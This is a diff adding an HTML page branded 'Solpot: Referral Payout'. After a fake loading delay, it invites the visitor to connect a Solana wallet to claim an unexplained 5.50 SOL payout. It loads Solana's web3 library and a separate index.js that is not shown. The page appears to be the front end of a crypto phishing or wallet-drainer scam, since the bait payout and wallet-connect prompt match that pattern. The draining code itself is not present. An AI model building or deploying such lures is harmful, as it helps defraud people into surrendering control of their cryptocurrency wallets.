@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Solpot: Referral Payout</title>
+  <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <!-- Solana Web3.js Library - REQUIRED for SOL transactions -->
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+  <style>
+    :root {
+      --bg: #0f0f1a;
+      --card-bg: #1a1a2e;
+      --text: #ffffff;
+      --text-secondary: #b0b0cc;
+      --accent: #00d1ff;
+      --accent-hover: #00b8e6;
+      --border: #2a2a40;
+      --shadow: rgba(0, 0, 0, 0.3);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      line-height: 1.6;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      text-align: center;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 2.5rem 2rem;
+      border: 1px solid var(--border);
+      box-shadow: 0 10px 30px var(--shadow);
+    }
+
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    p {
+      color: var(--text-secondary);
+      margin-bottom: 2rem;
+      font-size: 1rem;
+    }
+
+    .sol-amount {
+      font-size: 3rem;
+      font-weight: 700;
+      color: var(--accent);
+      margin: 1.5rem 0;
+      letter-spacing: -0.5px;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, var(--accent), #7b48ff);
+      color: white;
+      border: none;
+      padding: 1rem 2rem;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 12px;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0, 209, 255, 0.3);
+      margin-top: 1rem;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(0, 209, 255, 0.4);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    #loading-spinner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.3s ease;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-left: 4px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hidden-content {
+      display: none;
+    }
+
+    #nprogress .bar {
+      background: var(--accent) !important;
+      height: 3px !important;
+    }
+
+    #nprogress .peg {
+      box-shadow: 0 0 10px var(--accent), 0 0 5px var(--accent) !important;
+    }
+
+    #nprogress .spinner-icon {
+      border-top-color: var(--accent) !important;
+      border-left-color: var(--accent) !important;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loading-spinner">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="container hidden-content">
+    <div class="card">
+      <h1>Claim Your Payout</h1>
+      <p>Thank you for your cooperation! Connect your wallet and claim your payout.</p>
+      
+      <div class="sol-amount">5.50 SOL</div>
+
+      <button class="btn" id="connectWalletBtn">
+        Connect Wallet
+      </button>
+    </div>
+  </div>
+
+  <script>
+    function hideSpinner() {
+      const spinner = document.getElementById('loading-spinner');
+      const content = document.querySelector('.container');
+      
+      spinner.style.opacity = '0';
+      
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        content.classList.remove('hidden-content');
+      }, 300);
+    }
+
+    window.addEventListener('load', function() {
+      setTimeout(hideSpinner, 2000);
+    });
+  </script>
+
+  <!-- Load the wallet connector AFTER the page loads -->
+  <script src="index.js"></script>
+
+</body>
+</html>
